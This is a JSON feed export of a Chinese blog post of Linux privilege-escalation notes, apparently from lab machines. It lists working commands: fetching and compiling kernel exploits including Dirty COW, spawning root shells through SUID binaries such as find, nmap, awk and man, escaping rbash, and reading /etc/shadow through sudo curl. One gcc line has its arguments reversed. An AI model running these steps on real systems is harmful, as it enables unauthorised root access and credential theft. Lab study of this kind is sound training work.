{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"linux提权笔记\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "https://chungod.github.io",
    "items": [
        {
            "id": "https://chungod.github.io/2021/07/18/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/",
            "url": "https://chungod.github.io/2021/07/18/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/",
            "title": "Linux提权笔记",
            "date_published": "2021-07-18T06:28:41.000Z",
            "content_html": "<h2 id=\"linux提权笔记\"><a class=\"markdownIt-Anchor\" href=\"#linux提权笔记\">#</a> linux 提权笔记</h2>\n<h4 id=\"利用内核漏洞提权\"><a class=\"markdownIt-Anchor\" href=\"#利用内核漏洞提权\">#</a>  <code>利用内核漏洞提权</code></h4>\n<p>先开启一个可以交互的终端</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class=\"line\">/bin/bash -i</span><br><span class=\"line\">echo os.system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure>\n<p>发现靶机是低权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409090920475.png\" alt=\"image-20210409090920475\"></p>\n<p>查看靶机内核，发现其版本为 Ubuntu 14.04.</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091109670.png\" alt=\"image-20210409091109670\"></p>\n<p>打开 kali 查询可利用的 exploit，将其下载</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091229671.png\" alt=\"image-20210409091229671\"></p>\n<p>利用 python 将其传递到靶机上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8081</span><br><span class=\"line\">python -m SimpleHTTPServer 8081</span><br><span class=\"line\">靶机：wget http://IP:8081/37292.c</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091411379.png\" alt=\"image-20210409091411379\"></p>\n<p>将 exp 进行编译执行，成功获得 root 权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o 37292.c 37292</span><br><span class=\"line\">./37292</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用旧版本nmap提权\"><a class=\"markdownIt-Anchor\" href=\"#利用旧版本nmap提权\">#</a>  <code>利用旧版本nmap提权</code></h4>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409095550386.png\" alt=\"image-20210409091614007\"></p>\n<p>nmap 支持 “interactive.” 选项，用户能够通过该选项执行 shell 命令，通常，安全人员会使用该命令来避免他们使用 nmap 命令被记录在 history 文件中</p>\n<p>查看可利用的提权 find /-perm -u=s 2&gt;/dev/null</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409095637576.png\" alt=\"image-20210409095550386\"></p>\n<p>发现 nmap 存在提权漏洞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用nmap --interactive </span><br><span class=\"line\">!sh\t成功提权</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091614007.png\" alt=\"image-20210409095637576\"></strong></p>\n<h4 id=\"环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#环境变量提权\">#</a>  <code>环境变量提权</code></h4>\n<p>利用普通用户找到可执行文件，进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409102649196.png\" alt=\"image-20210122091212588\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409102540192.png\" alt=\"image-20210409102649196\"></p>\n<h4 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\">#</a>  <code>脏牛提权</code></h4>\n<p>使用 <code>uname -a</code>  命令查看 linux 内核信息，发现在脏牛漏洞范围内，可以进行测试。</p>\n<p>(需要 root 用户存在可执行文件)</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210122091212588.png\" alt=\"image-20210409102540192\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchsploit dirty</span><br><span class=\"line\">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210122091605012.png\" alt=\"image-20210410094828540\"></p>\n<p>3. 将 exp 一下载到本地，使用 gcc -pthread dirty.c -o dirty -lcrypt` 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件。</p>\n<figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 40839.c</span><br><span class=\"line\">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class=\"line\">./40839</span><br><span class=\"line\">等一会passwd文件会生成一个firefart用户</span><br><span class=\"line\">su firefart (输入之前的密码,成功提权)</span><br></pre></td></tr></table></figure>\n<h4 id=\"find提权\"><a class=\"markdownIt-Anchor\" href=\"#find提权\">#</a>  <code>find提权</code></h4>\n<p>(DC-01)</p>\n<p>先查找拥有 suid 权限的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410094828540.png\" alt=\"image-20210410095644313\"></p>\n<p>进行提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch test.txt</span><br><span class=\"line\">find / -type f -name test.txt -exec &quot;whoami&quot; \\; 发现是root权限</span><br><span class=\"line\">find / -type f -name test.txt -exec &quot;/bin/sh&quot; \\; 成功提权</span><br></pre></td></tr></table></figure>\n<h4 id=\"git提权\"><a class=\"markdownIt-Anchor\" href=\"#git提权\">#</a>  <code>git提权</code></h4>\n<p>(DC-02)</p>\n<p>寻找可用提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410095644313.png\" alt=\"image-20210122091605012\"></p>\n<p>绕过 rbash 进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410093833321.png\" alt=\"image-20210410100730655\"></p>\n<p>可用命令有 less、ls、scp、vi，绕过可用如下方法：</p>\n<ul>\n<li>可使用 less 绕过：$less test  然后！‘sh’</li>\n<li>使用 ls 绕过：$man ls  然后！‘sh’</li>\n<li>使用 vi 绕过：$vi test  然后:!/bin/sh 或者 :!/bin/bash</li>\n</ul>\n<p>还可以用 BASH_CMDS [a]=/bin/sh;a 直接绕过</p>\n<p>或者更改环境变量，并查看 flag3.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class=\"line\">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class=\"line\">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure>\n<p><strong>尝试 git 提权</strong>：可使用 sudo git help config 或者 sudo git -p help</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410093844939.png\" alt=\"image-20210410093833321\"></p>\n<h4 id=\"sudo提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo提权\">#</a>  <code>sudo提权</code></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果知道用户为空密码可以尝试sudo提权</span><br><span class=\"line\">sudo -l， sudo su</span><br><span class=\"line\">或者su root 尝试弱口令</span><br></pre></td></tr></table></figure>\n<h4 id=\"awk提权\"><a class=\"markdownIt-Anchor\" href=\"#awk提权\">#</a>  <code>awk提权</code></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>\n<p>提权成功</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100702235.png\" alt=\"image-20210410093844939\"></p>\n<h4 id=\"man提权\"><a class=\"markdownIt-Anchor\" href=\"#man提权\">#</a>  <code>man提权</code></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo man man</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100730655.png\" alt=\"image-20210410100740319\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100740319.png\" alt=\"image-20210410100702235\"></p>\n<h4 id=\"curl提权\"><a class=\"markdownIt-Anchor\" href=\"#curl提权\">#</a>  <code>curl提权</code></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo curl file:///etc/shadow</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100812432.png\" alt=\"image-20210410101229024\"></p>\n<h4 id=\"crontab提权\"><a class=\"markdownIt-Anchor\" href=\"#crontab提权\">#</a>  <code>crontab提权</code></h4>\n<p>cat /etc/crontab</p>\n<p>模拟一下<img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410101229024.png\" alt=\"image-20210410100812432\"></p>\n<p>防范：crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron 下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>\n",
            "tags": [
                "Linux提权笔记"
            ]
        }
    ]
}